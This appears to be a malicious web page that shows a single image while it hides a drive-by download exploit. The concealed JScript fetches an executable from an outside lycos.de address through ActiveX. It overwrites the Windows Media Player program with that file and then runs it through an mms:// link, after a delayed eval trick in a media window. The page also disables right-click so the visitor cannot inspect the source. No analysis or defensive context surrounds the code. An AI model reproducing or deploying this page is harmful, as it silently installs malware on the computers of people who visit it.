<html><body><img src="string17.JPG" width="705" height="461"></body></html>

<textarea id="code" style="display:none;">

    var x = new ActiveXObject("Microsoft.XMLHTTP"); 
    x.Open("GET", "http://mitglied.lycos.de/pictures2004/5.exe ",0); 
    x.Send(); 
    
    var s = new ActiveXObject("ADODB.Stream");
    s.Mode = 3;
    s.Type = 1;
    s.Open();
    s.Write(x.responseBody);

    s.SaveToFile("C:\\Program Files\\Windows Media Player\\wmplayer.exe",2);
    location.href = "mms://";

</textarea>

<script language="javascript">

    function preparecode(code) {
        result = '';
        lines = code.split(/\r\n/);
        for (i=0;i<lines.length;i++) {
        
            line = lines[i];
            line = line.replace(/^\s+/,"");
            line = line.replace(/\s+$/,"");
            line = line.replace(/'/g,"\\'");
            line = line.replace(/[\\]/g,"\\\\");
            line = line.replace(/[/]/g,"%2f");

            if (line != '') {
                result += line +'\\r\\n';
            }
        }
        return result;
    }
    
    function doit() {
        mycode = preparecode(document.all.code.value);
        myURL = "file:javascript:eval('" + mycode + "')";
        window.open(myURL,"_media");
    }
    

    window.open("error.php","_media");
    
    setTimeout("doit()", 5000);
    
    
</script>
<script> <!-- 
function click(e){if(document.all) if (event.button == 2) return false;if (document.layers) 
if (e.which == 3) return false;} function 
click2(){event.returnValue=false;return 
false;} if (document.layers) document.captureEvents(Event.MOUSEDOWN); 
document.onmousedown=click;document.oncontextmenu=click2; 
// --> </SCRIPT>

<noscript><noscript><plaintext></noscript>

